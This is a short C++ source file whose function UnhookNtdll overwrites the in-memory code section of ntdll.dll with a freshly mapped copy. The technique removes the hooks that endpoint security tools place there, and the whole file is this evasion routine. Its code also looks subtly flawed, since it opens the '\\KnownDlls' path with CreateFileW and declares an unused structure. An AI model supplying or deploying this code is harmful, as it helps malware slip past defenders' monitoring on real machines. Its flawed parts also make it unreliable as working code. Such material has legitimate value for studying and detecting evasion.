// ntdll.cpp
#include "ntdll.h"
#include <windows.h>
#include <winternl.h>
#include <iostream>

typedef struct _MANUAL_HOOK_FIX {
    void* original;
    void* clean;
    SIZE_T size;
} MANUAL_HOOK_FIX;

bool UnhookNtdll() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    HANDLE hFile = CreateFileW(L"\\KnownDlls\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    HANDLE hMapping = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) {
        CloseHandle(hFile);
        return false;
    }

    BYTE* pCleanNtdll = (BYTE*)MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pCleanNtdll) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return false;
    }

    // Get .text section of loaded and clean ntdll
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)hNtdll;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)dos + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);

    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sections[i].Name, ".text", 5) == 0) {
            void* orig = (BYTE*)hNtdll + sections[i].VirtualAddress;
            void* clean = pCleanNtdll + sections[i].VirtualAddress;
            SIZE_T size = sections[i].Misc.VirtualSize;

            DWORD oldProtect;
            if (VirtualProtect(orig, size, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                memcpy(orig, clean, size);
                VirtualProtect(orig, size, oldProtect, &oldProtect);
                std::cout << "[+] NTDLL unhooked successfully.\n";
            } else {
                std::cerr << "[-] VirtualProtect failed.\n";
            }
            break;
        }
    }

    UnmapViewOfFile(pCleanNtdll);
    CloseHandle(hMapping);
    CloseHandle(hFile);
    return true;
}
